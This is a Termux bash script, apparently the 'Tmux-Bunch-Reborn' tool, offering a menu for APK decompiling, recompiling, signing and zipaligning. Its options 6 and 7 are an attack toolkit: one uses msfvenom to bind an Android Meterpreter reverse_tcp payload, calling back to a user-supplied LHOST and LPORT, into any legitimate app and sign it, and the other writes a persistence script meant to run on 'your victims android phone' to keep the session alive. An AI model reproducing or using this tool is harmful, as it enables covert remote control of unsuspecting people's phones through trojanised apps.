#!/data/data/com.termux/files/usr/bin/bash
clear
DIR=$HOME/Tmux-Bunch-Reborn
choice="which file ? Enter number of choice or 'x' to exit"
esit="are you sure ? press ENTER to exit"
return="ENTER to return to TMUX-BUNCH menu"
title="Tmux-Bunch-Reborn is a extension to old Tmux-Bunch tool for complete apk modding in TERMUX."
VERSION="v1.0"
#colors
cyan='\033[1;36m'
green='\033[1;32m'
red='\033[1;31m'
yellow='\033[1;33m'
blue='\033[1;34m'
purple='\033[1;35m'
reset='\033[0m'

#banner
echo -e "$red               ┈┈┈╱▔▔▔▔▔▔▔▔╲┈┈┈  
               ┈┈┈▏┈┈┈┈┈┈┈┈▕┈┈┈
               ┈┈┈  ╭━╮┈┈╭━╮▕┈┈┈
                ╱▔╲╲╰━╯╱╲╰━╯╱╱▔╲
                ╲▂╲╲▏╮┈▔▔┈╭▕ ╲╲▂╱
                 ╱▔╲╲┣╋╋╋╋┫  ╲╲╲
               ╲▂╱┈╲▂▂▂▂▂▂╱┈╲▂╱"

echo
echo -e "$green          +_+_+_+_+_+_+_+_+_+_+_+_+_+"
echo -e "$blue              Tmux-Bunch-Reborn $VERSION"
echo -e "$green           +_+_+_+_+_+_+_+_+_+_+_+_+_+"
echo
echo
echo -e "$purple ENTER to continue"
read garbage
echo
echo
echo -e "$red   -----Hax4Us---Lokesh---Don't--CopY----"
echo
echo "   ------------LICENSE--INCLUDED----------"
echo
echo -e "$yellow      ~~~~~~~TMUX-BUNCH-REBORN~~~~~~~"
echo
echo -e "$blue                APK MODDING          "
echo "----------------------------------------"
echo
echo -e "$cyan $title"
echo
echo " $VERSION"
echo "-------------------------------------------"
echo
echo -e "$green Place apps in 'decompiler' folder."
echo
echo -e "$purple ------------------------------------------"
echo
echo -e "$yellow 1)Install frameworks (must for play with system apps)"
echo " 2)Decompile apk"
echo " 3)Recompile"
echo " 4)Sign apk-important for installing"
echo " 5)Zipalign (better optimization)"
echo " 6)Bind payload with any apk"
echo " 7)Persistence Backdoor Script"
echo " 8)About"
echo " 9)Credits"
echo " 10)Exit"
echo
echo -e "$blue ______________________"
echo
echo -e "$purple pick your option$reset"
read option
case "$option" in
1) echo
echo
echo
echo -e "$red You must place the framework-res.apk"
echo " from the /system/frameworks folder of your device"
echo "in frameworks folder"
echo
echo -e "$green press ENTER to continue"
echo
read garbage
cd $DIR/frameworks
ls | cat -n
echo
echo -e "$yellow $choice"
read option
if [ $option = 'x' ] ; then
echo -e "$red are you sure ? press ENTER to exit"
read garbage
exit
else
OUTPUT=`ls | sed -n $option'p'`
apktool if $DIR/frameworks/$OUTPUT -p $DIR
echo
echo
echo "_______________________"
echo
echo -e "$blue $return $reset"
read garbage
fi
cd $DIR
tmuxbunch ;;

2) echo
echo
echo -e "$yellow Decompiling an apk"
echo
echo -e "$green press ENTER to continue"
echo
read garbage
cd $DIR/decompiler
ls | cat -n
echo
echo
echo -e "$blue $choice"
read option
if [ $option = 'x' ] ; then
echo -e "$red $esit"
read garbage
exit
else
cd $DIR/decompiler
OUTPUT=`ls | sed -n $option'p'`
apktool d -f -r --force-manifest $DIR/decompiler/$OUTPUT -o $DIR/recompiler/$OUTPUT
echo
echo
echo
echo -e "$blue ____________________________________"
echo
echo -e "$yellow Decompiled files in 'recompiler' folder. You can now play with apk source code"
echo
echo -e "$green $return $reset"
read garbage
fi
cd $DIR
tmuxbunch ;;

3) echo
echo
echo
echo -e "$yellow This will compile the source code"
echo " The app can't be install until you sign it"
echo
echo -e "$blue press ENTER to continue"
echo
read garbage
cd $DIR/recompiler
ls | cat -n
echo
echo
echo -e "$yellow $choice"
read option
if [ $option = 'x' ]
then
echo -e "$red $esit"
read garbage
exit
else
OUTPUT=`ls | sed -n $option'p'`
apktool b --aapt $PREFIX/bin/aapt $DIR/recompiler/$OUTPUT -o $DIR/unsign/$OUTPUT
echo
echo
echo
echo -e "$green ________________________________________"
echo
echo -e "$blue recompiled apk in 'unsign' folder. Sign apk before installing"
echo
echo -e "$red $return $reset"
read garbage
fi
cd $DIR
tmuxbunch ;;

4) echo
echo
echo
echo -e "$yellow Sign the apk"
echo
echo " App will be ready to install after you sign it"
echo
echo -e "$greenpress ENTER to continue"
echo
read garbage
cd $DIR/unsign
ls | cat -n
echo
echo
echo -e "$yellow $choice"
read option
if [ $option = 'x' ] ; then
echo -e "$red $esit"
read d
exit
else
echo -e "$green signing apk ......."
OUTPUT=`ls | sed -n $option'p'`
apksigner -p hax4us keystore  $DIR/unsign/$OUTPUT $DIR/sign/signed_$OUTPUT
echo
echo
echo -e "$blue _______________________________________"
echo
echo -e "$green signed apk in 'sign' folder"
echo
echo -e "$red $return $reset"
read garbage
fi
cd $DIR
tmuxbunch ;;

5) echo
echo
echo
echo -e "$yellow place apk to be zipaligned in 'Zipalign' folder"
echo
echo -e "$green press ENTER to continue"
read garbage
cd $DIR/zipalign
ls | cat -n
echo
echo
echo -e "$blue $choice"
read option
if [ $option = 'x'] ; then
echo -e "$red $esit"
read garbage
exit
else
OUTPUT=`ls | sed -n $option'p'`
zipalign 4 $DIR/zipalign/$OUTPUT $DIR/zipaligned_$OUTPUT
echo
echo
echo -e "$blue________________________________________"
echo
echo -e "$yellow zipaligned apk in 'zipalign' folder"
echo
echo -e "$green $return $reset"
read garbage
fi
cd $DIR
tmuxbunch
;;

6) echo
echo -e "$red [*] Make sure , Metasploit is installed 📌"
echo
echo -e "$yellow [*] Please first move or copy your target apk file into binder folder 📩"
if [ ! -d $DIR/binder ]
	then
		mkdir $DIR/binder
		fi
echo
echo -e "$blue [*] Please wait ... 📡"
echo
cd $DIR/binder
ls | cat -n
echo
echo
echo -e "$yellow $choice"
read option
if [[ $option == "" ]]
	then
		echo -e "$red please enter valid choice\nSo please wait you are redirecting to Main Menu"
		sleep 3
		tmuxbunch
		fi
if [ $option = 'x' ] ; then
echo -e "$red $esit"
read garbage
exit
else
OUTPUT=`ls | sed -n $option'p'`
cp $DIR/binder/$OUTPUT $PREFIX/opt/metasploit-framework
echo -e "$purple [*] Please enter following details :-"
echo " [*] LHOST :-"
read lhost
echo " [*] LPORT :-"
read lport
echo " [*] ENTER THE NAME YOU WANT TO GIVE FOR THE FINAL APP"
read output
echo
echo -e "$blue [*] Please wait while binding.......🕜"
echo
cd $PREFIX/opt/metasploit-framework
msfvenom -x $OUTPUT -p android/meterpreter/reverse_tcp lhost=$lhost lport=$lport

echo -e "$green signing apk ......."
mv $DIR/unsign/output.apk $DIR/unsign/$output.apk
apksigner -p hax4us keystore $DIR/unsign/$output.apk $DIR/embout/$output.apk
rm $DIR/unsign/$output.apk
fi
echo
echo -e "$cyan We will met again :D , have a payload day..! 📢"
echo
echo -e "$blue press ENTER for main menu$reset"
read garbage
cd $DIR
tmuxbunch
;;
7) echo 
echo
printf "#!/system/bin/sh\nwhile :\ndo am start --user 0 -a android.intent.action.MAIN -n com.metasploit.stage/.MainActivity\nsleep 20\ndone" > $DIR/shell/shell.sh

echo -e "$yellow Script Generated In Shell Folder Of Tmux-Bunch :)"
echo
echo -e "$red Now you can run this script into your victims android phone and make your session died free payload :) $reset"
;;
8) echo
echo
echo
echo -e "$yellow                         About"
echo -e "$green     ------------------------------------------"
echo
echo -e "$blue I am trying to do with this tool is provide a user friendly program for noobs so they can play with apks before they really understand the process.This tool is also useful for experienced users that don't want to type the same command again and again.And this tool can also give you a great feature of payload binding with any legit app :)"
echo
echo -e "$green ENTER to continue"
read garbage
echo
echo
echo -e "$red----Creator Of This Script Or Tool ::--->> Lokesh (Hax4Us)---"
echo
echo
echo
echo -e "$blue          ~~~~~TMUX-BUNCH-REBORN~~~~~~"
echo
echo -e "$green ENTER to continue$reset"
read garbage
cd $DIR
tmuxbunch
;;

9) echo -e "$yellow       ---------Credits Goes To----------"
echo
echo " 1)Apktool Creator -> ibotpeaches"
echo " 3)Great Tools (apksigner ,zipalign )"
echo " 4)LoKesh(Hax4Us) -> Author"
echo
echo -e "$green ENTER to continue$reset"
read garbage
cd $DIR
tmuxbunch
;;
10) echo -e "$blue Bye Bye..!!"
	echo -e "$reset"
exit
;;
esac
